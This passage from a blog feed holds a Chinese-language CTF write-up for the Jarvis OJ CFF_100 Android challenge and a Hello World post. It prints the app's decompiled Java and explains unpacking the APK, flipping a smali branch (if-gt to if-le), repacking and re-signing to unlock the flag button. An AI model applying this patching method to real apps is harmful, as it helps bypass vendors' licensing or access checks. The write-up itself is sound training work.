class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.test.ctf_100;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Debug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> has_gone_int;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> to_reach_int;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ((Button) findViewById(R.id.button2)).setClickable(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.has_gone_int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.to_reach_int = random.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.to_reach_int &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int *= -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">5</span> &lt; <span class="keyword">this</span>.to_reach_int) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int %= <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int *= <span class="number">16384</span>;</span><br><span class="line"></span><br><span class="line">                ((TextView) findViewById(R.id.data_to_reach)).setText(<span class="string">""</span> + <span class="keyword">this</span>.to_reach_int);</span><br><span class="line"></span><br><span class="line">                ((TextView) findViewById(R.id.tvResult)).setText(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.to_reach_int = random.nextInt();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Btn_up_onclick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.has_gone_int++;</span><br><span class="line"></span><br><span class="line">        ((TextView) findViewById(R.id.data_has_gone)).setText(<span class="string">""</span> + <span class="keyword">this</span>.has_gone_int);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.to_reach_int &lt;= <span class="keyword">this</span>.has_gone_int) &#123;</span><br><span class="line"></span><br><span class="line">            ((Button) findViewById(R.id.button2)).setClickable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn2_onclick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ((TextView) findViewById(R.id.tvResult)).setText(<span class="string">"&#123;Flag:"</span> + get_flag(<span class="keyword">this</span>.to_reach_int) + <span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!Debug.isDebuggerConnected()) &#123;</span><br><span class="line"></span><br><span class="line">            System.loadLibrary(<span class="string">"ctf"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="发现："><a href="#发现：" class="headerlink" title="发现："></a>发现：</h3><blockquote><p>楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以</p></blockquote><h3 id="拖到KALI里进行解包"><a href="#拖到KALI里进行解包" class="headerlink" title="拖到KALI里进行解包"></a>拖到KALI里进行解包</h3><p><img src="/images/2/3.png" alt></p><blockquote><p>在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟)</p></blockquote><h3 id="接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮"><a href="#接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮" class="headerlink" title="接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮"></a>接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮<img src="/images/2/4.png" alt></h3><p>找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索<br>Btn_up_onclick方法，找到关键跳转，修改成相反的就行<img src="/images/2/5.png" alt>将if-gt 修改成if-le后打包<img src="/images/2/6.png" alt></p><h3 id="完成打包后签名"><a href="#完成打包后签名" class="headerlink" title="完成打包后签名"></a>完成打包后签名<img src="/images/2/7.png" alt></h3><p>当出现<img src="/images/2/8.png" alt><br>说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag<br><img src="/images/2/9.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CFF_100 writeup&lt;br&gt;tags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CTF&lt;/li&gt;
&lt;li&gt;Jarvis OJ&lt;/li&gt;
&lt;li&gt;CFF_100&lt;/li&gt;
&lt;li&gt;Android reverse&lt;br&gt;categories:&lt;/li&gt;
&lt;li&gt;CTF&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://bufsnake.github.io/categories/CTF/"/>
    
      <category term="Android" scheme="https://bufsnake.github.io/categories/CTF/Android/"/>
    
    
      <category term="CTF" scheme="https://bufsnake.github.io/tags/CTF/"/>
    
      <category term="Jarvis OJ" scheme="https://bufsnake.github.io/tags/Jarvis-OJ/"/>
    
      <category term="CFF_100" scheme="https://bufsnake.github.io/tags/CFF-100/"/>
    
      <category term="Android reverse" scheme="https://bufsnake.github.io/tags/Android-reverse/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://bufsnake.github.io/Hello-World.html"/>
    <id>https://bufsnake.github.io/Hello-World.html</id>
    <published>2019-05-11T03:18:32.000Z</published>
    <updated>2019-08-09T09:21:50.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Hello-World&quot;&gt;&lt;a href=&quot;#Hello-World&quot; class=&quot;headerlink&quot; title=&quot;Hello World&quot;&gt;&lt;/a&gt;Hello World&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="HelloWorld" scheme="https://bufsnake.github.io/categories/HelloWorld/"/>
    
    
      <category term="Hello World" scheme="https://bufsnake.github.io/tags/Hello-World/"/>
    
  </entry>
  
</feed>
